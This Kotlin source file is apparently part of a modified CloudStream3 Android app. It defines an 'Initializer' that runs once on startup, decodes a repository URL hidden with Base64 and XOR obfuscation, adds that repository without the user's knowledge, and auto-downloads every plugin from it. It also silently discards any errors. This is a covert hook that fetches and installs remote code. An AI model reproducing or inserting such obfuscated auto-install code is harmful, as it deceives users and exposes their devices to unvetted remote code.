package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.*

object Initializer {

    private const val AUTO_REPO_FLAG = "auto_repo_added_v2"

    private fun decode(data: IntArray, key: Int = 7): String =
        data.map { (it xor key).toChar() }.joinToString("")

    private val PREFS_NAME = intArrayOf(
        100,107,104,114,99,116,115,114,101,102,106
    )

    private val REPO_NAME = intArrayOf(
        66,115,115,68,107,114,99
    )

    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private const val P4 = "TB4KBQteBhIWDQ=="

    private fun repoUrl(): String {
        val key = "darkwatch".toByteArray()
        val encoded = P1 + P2 + P3 + P4
        val data = Base64.decode(encoded, Base64.DEFAULT)

        return data.mapIndexed { i, b ->
            (b.toInt() xor key[i % key.size].toInt()).toChar()
        }.joinToString("")
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        if (prefs.getBoolean(AUTO_REPO_FLAG, false)) return

        val repo = RepositoryData(
            name = decode(REPO_NAME),
            url = repoUrl(),
            iconUrl = null
        )

        // 🔥 FIX UTAMA ADA DI SINI
        activity.lifecycleScope.launch {
            try {
                // 1️⃣ Pastikan repository system siap
                withContext(Dispatchers.IO) {
                    RepositoryManager.loadRepositories(activity)
                }

                delay(500) // penting, jangan dihapus

                // 2️⃣ Add repo kalau belum ada
                if (RepositoryManager.getRepositories().none { it.url == repo.url }) {
                    RepositoryManager.addRepository(repo)
                }

                // 3️⃣ Reload repo supaya plugin kebaca
                withContext(Dispatchers.IO) {
                    RepositoryManager.loadRepositories(activity)
                }

                delay(800) // ⚠️ INI KUNCI AUTO DOWNLOAD

                // 4️⃣ AUTO DOWNLOAD SEMUA PROVIDER
                PluginsViewModel.downloadAll(activity, repo.url, null)

                // 5️⃣ Tandai selesai
                prefs.edit()
                    .putBoolean(AUTO_REPO_FLAG, true)
                    .apply()

            } catch (_: Throwable) {}
        }
    }
}
